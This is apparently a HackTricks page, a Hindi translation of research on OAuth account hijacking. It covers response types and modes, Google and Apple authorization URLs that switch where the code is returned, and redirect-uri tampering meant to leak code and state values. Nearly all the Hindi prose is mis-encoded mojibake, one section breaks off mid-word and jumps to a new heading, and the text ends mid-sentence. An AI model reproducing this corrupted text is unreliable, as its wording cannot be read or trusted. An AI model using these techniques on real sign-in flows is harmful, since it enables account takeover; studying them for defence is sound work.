# OAuth - Happy Paths, XSS, Iframes & Post Messages to leak code & state values

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**ред

</details>

**рдпрд╣ рд╕рд╛рдордЧреНрд░реА рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** [**https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url**](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)****

## рд╡рд┐рднрд┐рдиреНрди OAuth-рдбрд╛рдВрд╕ рдХреА рд╕рдордЭ

### рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рдХрд╛рд░

рдкрд╣рд▓реЗ, OAuth-рдбрд╛рдВрд╕ рдореЗрдВ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рдХрд╛рд░ред рдпреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдпрд╛ рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ**ред

рддреАрди рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рд╣реИрдВ:

1. **`code` + `state`**. **рдХреЛрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **OAuth-рдкреНрд░рджрд╛рддрд╛** рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреЛ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **`state`** рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рд╕рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЙрд▓ рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред рдпрд╣ OAuth-рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╣реИ рдХрд┐ рд╡рд╣ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрдерд┐рддрд┐ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВред
2. **`id_token`**. рдПрдХ JSON рд╡реЗрдм рдЯреЛрдХрди **(JWT) рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛** рд╣реИ рдЬреЛ OAuth-рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдкрд╣рдЪрд╛рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╡рд╣реА рд╣реИ рдЬреЛ рдпрд╣ рджрд╛рд╡рд╛ рдХрд░рддреА рд╣реИред
3. **`token`**. рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдХреЗ API рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ **рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди** рд╣реИред

### рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЛрдб

OAuth-рдбрд╛рдВрд╕ рдореЗрдВ рдХреЛрдб рдпрд╛ рдЯреЛрдХрди рдХреЛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рднрд┐рдиреНрди рдореЛрдб рд╣реЛрддреЗ рд╣реИрдВ, рдпреЗ рдЪрд╛рд░ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рд╣реИрдВ:

1. **Query**. рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА рдкреИрд░рд╛рдореАрдЯрд░ рднреЗрдЬрдирд╛ (`https://example.com/callback?code=xxx&state=xxx`)ред `code+state` рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред **рдХреЛрдб** рдХреЗрд╡рд▓ **рдПрдХ рдмрд╛рд░** **рдЙрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп **OAuth рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реАрдХреНрд░реЗрдЯ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдПрдХ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред&#x20;
1. [рдЯреЛрдХрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдпрд╣ рдореЛрдб рдЕрдиреБрд╢рдВрд╕рд┐рдд рдирд╣реАрдВ рд╣реИ](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#id\_token) рдХреНрдпреЛрдВрдХрд┐ **рдЯреЛрдХрди рдХрдИ рдмрд╛рд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░-рд▓реЙрдЧ рдпрд╛ рд╕рдорд╛рди рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП**ред рдЕрдзрд┐рдХрд╛рдВрд╢ OAuth-рдкреНрд░рджрд╛рддрд╛рдУрдВ рдЯреЛрдХрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдореЛрдб рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рдХреЗрд╡рд▓ рдХреЛрдб рдХреЗ рд▓рд┐рдПред рдЙрджрд╛рд╣рд░рдг:
* Apple рдж
### рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдкреНрд░рдХрд╛рд░/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдореЛрдб рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ

OAuth-рдбрд╛рдВрд╕ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдкреНрд░рдХрд╛рд░ рдпрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдореЛрдб рдмрджрд▓рдиреЗ рд╕реЗ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рдХреЛрдб рдпрд╛ рдЯреЛрдХрди рдХреИрд╕реЗ рд╡рд╛рдкрд╕ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕ рдкрд░ рдЕрдирдкреЗрдХреНрд╖рд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдкреНрд░рднрд╛рд╡ рдкрдбрд╝рддрд╛ рд╣реИред рдореИрдВрдиреЗ рдХрд┐рд╕реА рднреА OAuth-рдкреНрд░рджрд╛рддрд╛ рдХреЛ рдРрд╕рд╛ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рджреЗрдЦрд╛ рд╣реИ рдЬреЛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рд╕рдорд░реНрдерд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдкреНрд░рдХрд╛рд░ рдпрд╛ рдореЛрдб рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рджреЗрддрд╛ рд╣реЛ, рдЗрд╕рд▓рд┐рдП OAuth-рдкреНрд░рджрд╛рддрд╛ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрдо рд╕реЗ рдХрдо рджреЛ рдпрд╛ рдЕрдзрд┐рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдкреНрд░рдХрд╛рд░ рдХреЛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЧреИрд░-рдЦреБрд╢ рдкрде рдореЗрдВ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдПрдХрд╛рдзрд┐рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рднреА рдХреНрд╖рдорддрд╛ рд╣реИред рдПрдХ рд╡рд┐рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬреЛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддреА рд╣реИ [рдХрд┐ рдЬрдм рдПрдХрд╛рдзрд┐рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛-рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ-рдпреВрдЖрд░рдЖрдИ рдореЗрдВ рдорд╛рдиреЛрдВ рдХреЛ рдХреИрд╕реЗ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#Encoding):

> рдпрджрд┐, рдПрдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ, `response_type` рдореЗрдВ рдХреЗрд╡рд▓ рд╡рд╣реА рдорд╛рди рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рд╕рд░реНрд╡рд░ рдХреЛ рдбреЗрдЯрд╛ рдХреЛ рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдПрдирдХреЛрдб рдХрд░рдХреЗ рд╡рд╛рдкрд╕ рд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЗрд╕ рдПрдХрд╛рдзрд┐рдХ-рдорд╛рди рд╡рд╛рд▓реЗ `response_type` рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рдбреЗрдЯрд╛ рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдПрдирдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рд╕рд┐рдлрд╛рд░рд┐рд╢ рд╕рдлрд▓рддрд╛ рдФрд░ рддреНрд░реБрдЯрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рджреЛрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИред
>
> рдпрджрд┐, рдПрдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ, `response_type` рдореЗрдВ рдХреЛрдИ рднреА рдорд╛рди рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рд╕рд░реНрд╡рд░ рдХреЛ рдбреЗрдЯрд╛ рдХреЛ рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ рдореЗрдВ рдПрдирдХреЛрдб рдХрд░рдХреЗ рд╡рд╛рдкрд╕ рд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЗрд╕ рдПрдХрд╛рдзрд┐рдХ-рдорд╛рди рд╡рд╛рд▓реЗ `response_type` рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рдбреЗрдЯрд╛ рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ рдореЗрдВ рдПрдирдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рд╕рд┐рдлрд╛рд░рд┐рд╢ рд╕рдлрд▓рддрд╛ рдФрд░ рддреНрд░реБрдЯрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рджреЛрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИред

рдпрджрд┐ рдЗрд╕ рд╡рд┐рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдареАрдХ рд╕реЗ рдкрд╛рд▓рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдк рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП `code`-рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди **рдпрджрд┐ рдЖрдк рд╕рд╛рде рд╣реА `id_token` рдХрд╛ рднреА рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ, рддреЛ `code`-рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдмрдЬрд╛рдп рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред

Google рдХреЗ рд╕рд╛рдЗрди-рдЗрди рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ:
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
рдпрд╣ `https://example.com/callback?code=xxx&state=yyy` рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрдЧрд╛ред рд▓реЗрдХрд┐рди:
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code,id_token&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
рдпрд╣ `https://example.com/callback#code=xxx&state=yyy&id_token=zzz` рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред

рдпрджрд┐ рдЖрдк Apple рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдПрдХ рд╣реА рд╡рд┐рдЪрд╛рд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ:
```
https://appleid.apple.com/auth/authorize?
response_type=code&
response_mode=query&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
рдЖрдк `https://example.com/callback?code=xxx&state=yyy` рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ, рд▓реЗрдХрд┐рди:
```
https://appleid.apple.com/auth/authorize?
response_type=code+id_token&
response_mode=fragment&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
рдЖрдкрдХреЛ `https://example.com/callback#code=xxx&state=yyy&id_token=zzz` рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

## рдЧреИрд░-рдЦреБрд╢ рдкрде

рдЗрд╕ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЗ рд▓реЗрдЦрдХ рдиреЗ **рдЧреИрд░-рдЦреБрд╢ рдкрде рдХреЛ рдЧрд▓рдд URL рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд╛рди рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдУрдЖрде рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рд╣реИред рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдПрдХ рдорд╛рдиреНрдп рд╕реНрдерд┐рддрд┐ + рдХреЛрдб рдХрд╛ рдЯреЛрдХрди рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рд▓реЗрдХрд┐рди рд╡рд╣ рдЕрдкреЗрдХреНрд╖рд┐рдд рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдкрд╛рддрд╛ рд╣реИ**, рддреЛ рд╡рд╣ **рдЬрд╛рдирдХрд╛рд░реА рдареАрдХ рд╕реЗ рдЙрдкрднреЛрдЧ рдирд╣реАрдВ рдХреА рдЬрд╛рдПрдЧреА** рдФрд░ рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрд┐рд╕реА рддрд░реАрдХреЗ рд╕реЗ **рдЙрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ** рдХрд╛ рддрд░реАрдХрд╛ рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ "рдЧреИрд░-рдЦреБрд╢ рдкрде" рд╕реЗ рддреЛ рд╡рд╣ **рдЦрд╛рддрд╛ рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд╕рдХреЗрдЧрд╛**ред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдУрдЖрде рдлрд╝реНрд▓реЛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдкрде рддрдХ рдкрд╣реБрдВрдЪреЗрдЧрд╛, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд **рдЧрд▓рдд-рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдУрдЖрде рдЕрдиреБрд░реЛрдз рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЧреИрд░-рдЦреБрд╢ рдкрде рддрдХ рдкрд╣реБрдВрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ-uri рдорд┐рд▓рд╛рди рдирд╣реАрдВ рд╣реЛрдирд╛

рдЗрди "рд╕рд╛рдорд╛рдиреНрдп" рдкрд╛рдП рдЧрдП **рдЧрд▓рдд-рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ рдУрдЖрде рд╕рдВрдЪрд╛рд░ рдХреЗ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ url** рдореЗрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред

[**рд╡рд┐рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛**](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-19#section-2.1) **** рд╕рдЦреНрдд рд░реВрдк рд╕реЗ рдЗрдВрдЧрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ url рдХреЛ рд╕рдЦреНрддрддрд╛ рд╕реЗ рддреБрд▓рдирд╛ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП рдЬреЛ рдХрд┐ рдкреЛрд░реНрдЯ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдмрджрд▓рд╛рд╡ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рдЕрдВрдд-рдмрд┐рдВрджреБрдУрдВ рдиреЗ рдХреБрдЫ рд╕рдВрд╢реЛрдзрдиреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреА:

### рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ-uri рдкрде рдЬреЛрдбрд╝рдирд╛

рдХреБрдЫ рдУрдЖрде-рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ `redirect_uri` рдХреЗ рдкрде рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдпрд╣ "рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ-uri рдорд╛рдорд▓рд╛ рд╢рд┐рдлреНрдЯрд┐рдВрдЧ" рдХреЗ рд▓рд┐рдП рднреА рд╡рд┐рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рддреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `https://example.com/callback` рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ uri рд╣реЛрдиреЗ рдкрд░, рдЗрд╕реЗ рднреЗрдЬрдирд╛:
```
response_type=id_token&
redirect_uri=https://example.com/callbackxxx
```
рдпрд╣рд╛рдВ `https://example.com/callbackxxx#id_token` рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

### рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ-uri рдкреИрд░рд╛рдореАрдЯрд░ рдЬреЛрдбрд╝рдирд╛

рдХреБрдЫ OAuth-рдкреНрд░рджрд╛рддрд╛рдУрдВ **рдЕрддрд┐рд░рд┐рдХреНрдд рдХреНрд╡реЗрд░реА рдпрд╛ рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ рдкреИрд░рд╛рдореАрдЯрд░** рдХреЛ `redirect_uri` рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЧреИрд░-рд╣реИрдкреНрдкреА рдкрде рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ URL рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдорд╛рди рдкреИрд░рд╛рдореАрдЯрд░ рдкреНрд░рджрд╛рди рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `https://example.com/callback` рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ uri рд╣реЛрдиреЗ рдкрд░, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ 